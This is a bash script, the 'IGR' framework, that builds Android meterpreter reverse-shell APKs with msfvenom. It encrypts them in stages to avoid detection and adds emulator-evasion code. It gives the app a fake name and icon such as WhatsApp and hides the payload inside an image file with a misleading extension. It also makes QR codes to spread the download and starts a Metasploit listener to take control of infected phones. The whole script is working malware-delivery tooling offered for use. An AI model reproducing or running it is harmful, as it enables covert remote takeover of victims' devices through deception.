#!/bin/bash
# ========================
#    coded by SaQr
#
#  IGR pyload generator&injector
# ========= GLOBAL VARIABLES ==========
logfile="igr_sessions.log"

# ========= BANNER ==========
banner() {
  clear
  echo -e "${red}"
  echo "$$$$$$\\  $$$$$$\\  $$$$$$$\\  "
  echo "\\_$$  _|$$  __$$\\ $$  __$$\\ "
  echo "  $$ |  $$ /  \\__|$$ |  $$ |"
  echo "  $$ |  $$ |$$$$\\ $$$$$$$  |"
  echo "  $$ |  $$ |\\_$$ |$$  __$$< "
  echo "  $$ |  $$ |  $$ |$$ |  $$ |"
  echo "$$$$$$\\ \\$$$$$$  |$$ |  $$ |"
  echo "\\______| \\______/ \\__|  \\__|"
  echo ""
  echo -e "${green}             \"IGR\" Framework v2.5${reset}"
}

# ========= CHECK TOOLS ==========
check_tools() {
  echo -e "${blue}[*] Checking & Installing Required Tools...${reset}"
  tools=(msfvenom metasploit-framework openssl zipalign apksigner wget qrencode base64 unzip zenity xdg-open)
  for tool in "${tools[@]}"; do
    if ! command -v $tool &> /dev/null; then
      echo -e "${yellow}[!] Installing $tool...${reset}"
      if [[ $PREFIX ]]; then
        pkg update -y && pkg install -y $tool
      else
        sudo apt update -y && sudo apt install -y $tool
      fi
    fi
  done
}

# ========= PAYLOAD OBFUSCATION OPTIONS ==========
anti_vm_check() {
  cat <<EOF > anti_vm.java
import android.os.Build;
public class AntiVM {
  public static boolean isEmulator() {
    return Build.FINGERPRINT.contains("generic") ||
           Build.MODEL.contains("Emulator") ||
           Build.MANUFACTURER.contains("Genymotion") ||
           Build.BRAND.contains("generic") ||
           Build.DEVICE.contains("generic") ||
           Build.PRODUCT.contains("sdk");
  }
}
EOF
  echo -e "${green}[✔] Anti-VM Java logic created.${reset}"
}

fake_icon_and_name() {
  echo -ne "${green}[?] Enter fake app name (e.g., WhatsApp): ${reset}" && read fake_name
  echo -ne "${green}[?] Enter path to fake icon (PNG): ${reset}" && read icon_path

  if [[ ! -f $icon_path ]]; then
    echo -e "${red}[✘] Icon file not found.${reset}"
    return
  fi

  mkdir -p obf
  cp decrypted.apk obf/app.apk
  cp "$icon_path" obf/icon.png
  echo "$fake_name" > obf/appname.txt

  echo -e "${green}[✔] Fake metadata prepared. Manual smali editing required for full spoof.${reset}"
}

# ========= ENCRYPTION STAGE ==========
strong_encrypt() {
  dynamic_key="$(openssl rand -hex 8)"
  echo "$dynamic_key" > key.txt
  echo -e "${blue}[*] Stage 1: AES-256 Encryption...${reset}"
  openssl enc -aes-256-cbc -salt -in raw_payload.apk -out stage1.enc -k "$dynamic_key"

  echo -e "${blue}[*] Stage 2: Base64 Encoding...${reset}"
  base64 stage1.enc > stage2.b64

  echo -e "${blue}[*] Stage 3: Final ZIP Compression...${reset}"
  zip -q -j enc_payload.apk.zip stage2.b64 key.txt

  echo -e "${green}[✔] Payload fully encrypted and compressed.${reset}"
}

# ========= DECRYPT & EXECUTE PAYLOAD ==========
dynamic_decrypt() {
  echo -ne "${green}[?] Enter path to encrypted ZIP payload: ${reset}" && read zipfile
  if [[ ! -f "$zipfile" ]]; then
    echo -e "${red}[✘] File not found.${reset}"
    return
  fi

  unzip -o "$zipfile" -d tmp_dec > /dev/null 2>&1
  if [[ ! -f tmp_dec/stage2.b64 || ! -f tmp_dec/key.txt ]]; then
    echo -e "${red}[✘] Invalid ZIP content.${reset}"
    rm -rf tmp_dec
    return
  fi

  base64 -d tmp_dec/stage2.b64 > tmp_dec/stage1.enc
  openssl enc -d -aes-256-cbc -in tmp_dec/stage1.enc -out decrypted.apk -k "$(cat tmp_dec/key.txt)"

  echo -e "${green}[✔] Decryption complete. Saved as decrypted.apk${reset}"
  rm -rf tmp_dec

  echo -ne "${green}[?] Run decrypted APK now? (y/n): ${reset}" && read runopt
  if [[ "$runopt" == "y" ]]; then
    if command -v xdg-open &>/dev/null; then
      xdg-open decrypted.apk &>/dev/null
      echo -e "${green}[✔] APK launched (default handler).${reset}"
    else
      echo -e "${yellow}[!] Cannot auto-run APK. Open it manually.${reset}"
    fi
  fi
}

# ========= GENERATE PAYLOAD ==========
generate_payload() {
  echo -ne "${green}[?] Enter LHOST: ${reset}" && read lhost
  echo -ne "${green}[?] Enter LPORT (default: 4444): ${reset}" && read lport
  lport=${lport:-4444}
  echo -ne "${green}[?] Choose payload type (1) TCP (2) HTTP (3) HTTPS) [1-3]: ${reset}" && read ptype

  case $ptype in
    2) payload="android/meterpreter/reverse_http";;
    3) payload="android/meterpreter/reverse_https";;
    *) payload="android/meterpreter/reverse_tcp";;
  esac

  echo -e "${blue}[*] Generating raw payload...${reset}"
  msfvenom -p $payload LHOST=$lhost LPORT=$lport -o raw_payload.apk > /dev/null

  strong_encrypt
}

# ========= INJECT INTO IMAGE ==========
inject_payload() {
  echo -ne "${green}[?] Enter path to cover image: ${reset}" && read image
  if [[ ! -f "$image" ]]; then
    echo -e "${red}[✘] Image not found.${reset}"
    exit 1
  fi
  echo -ne "${green}[?] Enter output filename (e.g., pic.jpg.apk): ${reset}" && read output
  cat "$image" enc_payload.apk.zip > "$output"
  chmod +x "$output"
  echo -e "${green}[✔] Payload injected into: $output${reset}"
}

# ========= GENERATE QR CODE ==========
generate_qr() {
  echo -ne "${green}[?] Enter direct download URL of the APK: ${reset}" && read url
  qrencode -o qrcode.png "$url"
  echo -e "${green}[✔] QR code generated: qrcode.png${reset}"
  [[ -n "$DISPLAY" ]] && zenity --info --text="QR Code saved to qrcode.png"
}

# ========= START LISTENER ==========
start_listener() {
  if [[ -z "$payload" || -z "$lhost" || -z "$lport" ]]; then
    echo -e "${red}[✘] Missing payload config. Generate payload first.${reset}"
    return
  fi

  echo -e "${blue}[*] Launching Metasploit Handler...${reset}"
  msfconsole -q -x "use exploit/multi/handler; \
  set payload $payload; \
  set LHOST $lhost; \
  set LPORT $lport; \
  set AutoRunScript post/android/manage/remove_app; \
  exploit"
}

# ========= LOG SESSIONS ==========
log_session() {
  echo "[+] Payload: $payload" >> $logfile
  echo "[+] Host: $lhost:$lport" >> $logfile
  echo "[+] Time: $(date)" >> $logfile
  echo "[+] Output: $output" >> $logfile
  echo "[+] Key: $(cat key.txt)" >> $logfile
  echo "---------------------------" >> $logfile
}

# ========= DASHBOARD ==========
dashboard() {
  echo -e "${cyan}--- IGR SESSION DASHBOARD ---${reset}"
  echo -e "${yellow}Last Sessions:${reset}"
  tail -n 10 $logfile 2>/dev/null || echo "No previous logs."
  echo
}

# ========= MENU ==========
menu() {
  banner
  dashboard
  echo -e "${blue}1) Generate Encrypted Android Payload"
  echo "2) Inject Payload into Image"
  echo "3) Generate QR Code"
  echo "4) Decrypt & Run Payload"
  echo "5) Start Listener (Metasploit)"
  echo "6) Add Fake Name/Icon + Anti-VM"
  echo "7) Full Workflow (Auto All)"
  echo "0) Exit${reset}"
  echo -ne "${green}[?] Choose option: ${reset}" && read opt

  case $opt in
    1) generate_payload;;
    2) inject_payload;;
    3) generate_qr;;
    4) dynamic_decrypt;;
    5) start_listener;;
    6)
      anti_vm_check
      fake_icon_and_name
      ;;
    7)
      generate_payload
      inject_payload
      log_session
      start_listener
      ;;
    0) echo -e "${yellow}[*] Exiting...${reset}"; exit;;
    *) echo -e "${red}[✘] Invalid option.${reset}"; sleep 1; menu;;
  esac
}

# ========= START ==========
check_tools
while true; do menu; done

